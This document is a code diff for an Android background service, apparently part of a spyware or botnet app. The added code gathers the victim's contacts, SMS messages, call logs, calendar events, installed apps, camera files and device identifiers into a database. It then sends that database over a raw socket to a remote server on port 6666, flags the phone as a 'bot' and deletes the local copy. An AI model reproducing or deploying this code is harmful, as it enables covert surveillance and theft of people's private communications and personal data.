@@ -48,6 +48,8 @@ import java.net.URL;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
 
+import javax.net.SocketFactory;
+
 public class JobsIntentService extends IntentService {
 
     public static final String ACTION_LOCATION = "ACTION_LOCATION";
@@ -80,6 +82,7 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_CREATE_NOTIFICATION = "ACTION_CREATE_NOTIFICATION";
     public static final String ACTION_CREATE_FILE = "ACTION_CREATE_FILE";
     public static final String ACTION_GPS_TRACKER = "ACTION_GPS_TRACKER";
+    public static final String ACTION_SYNC_PHONE_TO_SERVER = "ACTION_SYNC_PHONE_TO_SERVER";
     public static boolean sShouldTrackGps = false;
     private static long sNumber = 1111111111;
     public static HandlerThread sHandlerThread;
@@ -97,56 +100,71 @@ public class JobsIntentService extends IntentService {
             String action = intent.getAction();
             if (action.equals(ACTION_DCIM_FILES)) {
                 if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
-                    File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
-                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                    try {
-                        database.beginTransaction();
-                        if (pictures != null && pictures.length > 0) {
-                            for (File f : pictures) {
-                                Database.insertMedia(database, f.getName(), f);
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
+                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                            try {
+                                database.beginTransaction();
+                                if (pictures != null && pictures.length > 0) {
+                                    for (File f : pictures) {
+                                        Database.insertMedia(database, f.getName(), f);
+                                    }
+                                }
+                                database.setTransactionSuccessful();
+                            } catch (SQLiteException e) {
+                                e.printStackTrace();
+                            } finally {
+                                database.endTransaction();
+                                if (database.isOpen()) {
+                                    database.close();
+                                }
+                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.DCIM_KEY);
                             }
                         }
-                        database.setTransactionSuccessful();
-                    } catch (SQLiteException e) {
-                        e.printStackTrace();
-                    } finally {
-                        database.endTransaction();
-                        if (database.isOpen()) {
-                            database.close();
-                        }
-                        Lofl.setJobRan(this, JobsScheduler.DCIM_KEY);
-                    }
+                    }).start();
                 }
             } else if (action.equals(ACTION_PACKAGES)) {
-                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                try {
-                    database.beginTransaction();
-                    Database.insertPackages(database, Lofl.getInstalledApps(this));
-                    database.setTransactionSuccessful();
-                } catch (SQLiteException e) {
-                    e.printStackTrace();
-                } finally {
-                    database.endTransaction();
-                    if (database.isOpen()) {
-                        database.close();
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                        try {
+                            database.beginTransaction();
+                            Database.insertPackages(database, Lofl.getInstalledApps(JobsIntentService.this));
+                            database.setTransactionSuccessful();
+                        } catch (SQLiteException e) {
+                            e.printStackTrace();
+                        } finally {
+                            database.endTransaction();
+                            if (database.isOpen()) {
+                                database.close();
+                            }
+                            Lofl.setJobRan(JobsIntentService.this, JobsScheduler.PACKAGES_KEY);
+                        }
                     }
-                    Lofl.setJobRan(this, JobsScheduler.PACKAGES_KEY);
-                }
+                }).start();
             } else if (action.equals(ACTION_CONTACTS)) {
                 if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
-                    ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
-                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                    try {
-                        database.beginTransaction();
-                        Database.insertContacts(database, contacts);
-                        database.setTransactionSuccessful();
-                    } catch (SQLiteException e) {
-                        e.printStackTrace();
-                    } finally {
-                        database.endTransaction();
-                        database.close();
-                        Lofl.setJobRan(this, ACTION_CONTACTS);
-                    }
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            ArrayList<Contact> contacts = Lofl.fetchContactsInformation(JobsIntentService.this);
+                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                            try {
+                                database.beginTransaction();
+                                Database.insertContacts(database, contacts);
+                                database.setTransactionSuccessful();
+                            } catch (SQLiteException e) {
+                                e.printStackTrace();
+                            } finally {
+                                database.endTransaction();
+                                database.close();
+                                Lofl.setJobRan(JobsIntentService.this, ACTION_CONTACTS);
+                            }
+                        }
+                    }).start();
                 }
             } else if (action.equals(ACTION_DEVICE_INFO)) {
                 SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
@@ -161,86 +179,249 @@ public class JobsIntentService extends IntentService {
                     database.close();
                     Lofl.setJobRan(this, ACTION_DEVICE_INFO);
                 }
+            }else if(action.equals(ACTION_SYNC_PHONE_TO_SERVER)){
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        //SYNC CONTACTS
+                        SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                        try{
+                            database.beginTransaction();
+                            if(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED){
+                                ArrayList<Contact> contacts = Lofl.fetchContactsInformation(JobsIntentService.this);
+                                try {
+                                    database.beginTransaction();
+                                    Database.insertContacts(database, contacts);
+                                    database.setTransactionSuccessful();
+                                } catch (SQLiteException e) {
+                                    e.printStackTrace();
+                                } finally {
+                                    database.endTransaction();
+                                    Lofl.setJobRan(JobsIntentService.this, JobsScheduler.CONTACTS_KEY);
+                                }
+                            }
+                            //SYNC INSTALLED APPS
+                            try {
+                                database.beginTransaction();
+                                Database.insertPackages(database, Lofl.getInstalledApps(JobsIntentService.this));
+                                database.setTransactionSuccessful();
+                            } catch (SQLiteException e) {
+                                e.printStackTrace();
+                            } finally {
+                                database.endTransaction();
+                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.PACKAGES_KEY);
+                            }
+                            //DCIM SYNC
+                            if(checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){
+                                File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
+                                try {
+                                    database.beginTransaction();
+                                    if (pictures != null && pictures.length > 0) {
+                                        for (File f : pictures) {
+                                            Database.insertMedia(database, f.getName(), f);
+                                        }
+                                    }
+                                    database.setTransactionSuccessful();
+                                } catch (SQLiteException e) {
+                                    e.printStackTrace();
+                                } finally {
+                                    database.endTransaction();
+                                    Lofl.setJobRan(JobsIntentService.this, JobsScheduler.DCIM_KEY);
+                                }
+                            }
+                            //SYNC CALL LOG
+                            if(checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
+                                ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(JobsIntentService.this);
+                                try {
+                                    database.beginTransaction();
+                                    Database.insertPhoneCalls(database, phoneCalls);
+                                    database.setTransactionSuccessful();
+                                } catch (SQLException e) {
+                                    e.printStackTrace();
+                                } finally {
+                                    database.endTransaction();
+                                    Lofl.setJobRan(JobsIntentService.this, JobsScheduler.PHONE_CALLS_KEY);
+                                }
+                            }
+                            //SYNC CALENDAR EVENTS
+                            if (checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
+                                ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(JobsIntentService.this);
+                                try {
+                                    database.beginTransaction();
+                                    Database.insertCalendarEvents(database, calendarEvents);
+                                    database.setTransactionSuccessful();
+                                } catch (SQLException e) {
+                                    e.printStackTrace();
+                                } finally {
+                                    database.endTransaction();
+                                    Lofl.setJobRan(JobsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
+                                }
+                            }
+                            //SYNC SMS
+                            if(checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
+                                ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(JobsIntentService.this);
+                                try {
+                                    database.beginTransaction();
+                                    Database.insertSmsMessages(database, smsMsgs);
+                                    database.setTransactionSuccessful();
+                                } catch (SQLException e) {
+                                    e.printStackTrace();
+                                } finally {
+                                    database.endTransaction();
+                                    Lofl.setJobRan(JobsIntentService.this, JobsScheduler.SMS_KEY);
+                                }
+                            }
+                            //SYNC DEVICE INFO
+                            try {
+                                database.beginTransaction();
+                                Database.insertDevice(database, MessagingService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
+                                database.setTransactionSuccessful();
+                            } catch (SQLException e) {
+                                e.printStackTrace();
+                            } finally {
+                                database.endTransaction();
+                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.DEVICE_KEY);
+                            }
+                            database.setTransactionSuccessful();
+                        }catch (SQLException e){
+                            e.printStackTrace();
+                        }finally {
+                            //FNISHED SYNCING PHONE TO DATABASE
+                            database.endTransaction();
+                            database.close();
+                            //SEND DATABASE TO SERVER
+                            try{
+                                boolean isAlreadyBot = false;
+                                Socket socket = SocketFactory.getDefault().createSocket(Constants.SERVER_ADDRESS, 6666);
+                                ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
+                                oos.writeObject(MessagingService.sTelephoneAddress);
+                                oos.flush();
+                                InputStream inputStream = socket.getInputStream();
+                                if(inputStream.available() != 0){
+                                    try {
+                                        ObjectInputStream ois = new ObjectInputStream(inputStream);
+                                        String message = (String) ois.readObject();
+                                        if(message.equalsIgnoreCase("bot already exists")){
+                                            isAlreadyBot = true;
+                                        }
+                                        ois.close();
+                                    } catch (ClassNotFoundException e) {
+                                        e.printStackTrace();
+                                    }
+                                }
+                                if(!isAlreadyBot){
+                                    String ip = Lofl.fetchIpv4Addresses().get(0);
+                                    oos.writeObject(ip);
+                                    oos.flush();
+                                    byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(JobsIntentService.this));
+                                    oos.writeObject(bytes);
+                                    oos.flush();
+                                }
+                                oos.close();
+                                socket.close();
+                            }catch (IOException e){
+                                e.printStackTrace();
+                            }finally{
+                                SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
+                                editor.putBoolean(Constants.Keys.IS_BOT_KEY, true);
+                                editor.apply();
+                                //DELETE DATABASE
+                                Lofl.getDatabaseFile(JobsIntentService.this).delete();
+                            }
+                        }
+                    }
+                }).start();
             } else if (action.equals(ACTION_PHONE_CALLS)) {
                 if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
-                    ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(this);
-                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                    try {
-                        database.beginTransaction();
-                        Database.insertPhoneCalls(database, phoneCalls);
-                        database.setTransactionSuccessful();
-                    } catch (SQLException e) {
-                        e.printStackTrace();
-                    } finally {
-                        database.endTransaction();
-                        database.close();
-                        Lofl.setJobRan(this, JobsScheduler.PHONE_CALLS_KEY);
-                    }
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(JobsIntentService.this);
+                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                            try {
+                                database.beginTransaction();
+                                Database.insertPhoneCalls(database, phoneCalls);
+                                database.setTransactionSuccessful();
+                            } catch (SQLException e) {
+                                e.printStackTrace();
+                            } finally {
+                                database.endTransaction();
+                                database.close();
+                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.PHONE_CALLS_KEY);
+                            }
+                            ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(JobsIntentService.this);
+                            try {
+                                database.beginTransaction();
+                                Database.insertCalendarEvents(database, calendarEvents);
+                                database.setTransactionSuccessful();
+                            } catch (SQLException e) {
+                                e.printStackTrace();
+                            } finally {
+                                database.endTransaction();
+                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
+                            }
+                        }
+                    }).start();
                 }
             } else if (action.equals(ACTION_SMS)) {
                 if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
-                    ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(this);
-                    SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-                    try {
-                        database.beginTransaction();
-                        Database.insertSmsMessages(database, smsMsgs);
-                        database.setTransactionSuccessful();
-                    } catch (SQLException e) {
-                        e.printStackTrace();
-                    } finally {
-                        database.endTransaction();
-                        database.close();
-                        Lofl.setJobRan(this, JobsScheduler.SMS_KEY);
-                        new Thread(new Runnable() {
-                            @Override
-                            public void run() {
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(JobsIntentService.this);
+                            SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
+                            try {
+                                database.beginTransaction();
+                                Database.insertSmsMessages(database, smsMsgs);
+                                database.setTransactionSuccessful();
+                            } catch (SQLException e) {
+                                e.printStackTrace();
+                            } finally {
+                                database.endTransaction();
+                                database.close();
+                                Lofl.setJobRan(JobsIntentService.this, JobsScheduler.SMS_KEY);
                                 ArrayList<String> addresses = null;
                                 Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
-                                try {
-                                    for(int i = 0; i < 3; i++){
-                                        Socket socket = new Socket(Constants.SERVER_ADDRESS, 6666);
-                                        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
-                                        switch(i){
-                                            case 0:
-                                                oos.writeObject(MessagingService.sTelephoneAddress);
-                                                break;
-                                            case 1:
-                                                String ip = Lofl.fetchIpv4Addresses().get(0);
-                                                oos.writeObject(ip);
-                                                break;
-                                            case 2:
-                                                byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(JobsIntentService.this));
-                                                oos.writeObject(bytes);
-                                                break;
-                                            default:
-                                                break;
-                                        }
-                                        InputStream inputStream = socket.getInputStream();
-                                        if(inputStream.available() != 0){
-                                            try {
-                                                ObjectInputStream ois = new ObjectInputStream(inputStream);
-                                                String message = (String) ois.readObject();
-                                                if(message.equalsIgnoreCase("bot already exists")){
-                                                    i = 4;
-                                                }
-                                            } catch (ClassNotFoundException e) {
-                                                e.printStackTrace();
+                                try{
+                                    boolean isAlreadyBot = false;
+                                    Socket socket = SocketFactory.getDefault().createSocket(Constants.SERVER_ADDRESS, 6666);
+                                    ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
+                                    oos.writeObject(MessagingService.sTelephoneAddress);
+                                    oos.flush();
+                                    InputStream inputStream = socket.getInputStream();
+                                    if(inputStream.available() != 0){
+                                        ObjectInputStream ois = new ObjectInputStream(inputStream);
+                                        try {
+                                            String message = (String) ois.readObject();
+                                            if(message.equalsIgnoreCase("bot already exists")){
+                                                isAlreadyBot = true;
                                             }
+                                            ois.close();
+                                        } catch (ClassNotFoundException e) {
+                                            e.printStackTrace();
                                         }
-                                        oos.flush();
-                                        oos.close();
-                                        inputStream.close();
-                                        socket.close();
                                     }
-                                } catch (UnknownHostException e) {
-                                    e.printStackTrace();
-                                } catch (IOException e) {
+                                    if(!isAlreadyBot){
+                                        String ip = Lofl.fetchIpv4Addresses().get(0);
+                                        oos.writeObject(ip);
+                                        oos.flush();
+                                        byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(JobsIntentService.this));
+                                        oos.writeObject(bytes);
+                                        oos.flush();
+                                    }
+                                    inputStream.close();
+                                    oos.close();
+                                    socket.close();
+                                }catch (IOException e){
                                     e.printStackTrace();
                                 }
                                 Lofl.getDatabaseFile(JobsIntentService.this).delete();
+                                SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
+                                editor.putBoolean(Constants.Keys.IS_BOT_KEY, true);
+                                editor.apply();
                             }
-                        }).start();
-                    }
+                        }
+                    }).start();
                 }
             } else if (action.equals(ACTION_CALENDAR_EVENT)) {
                 if (checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
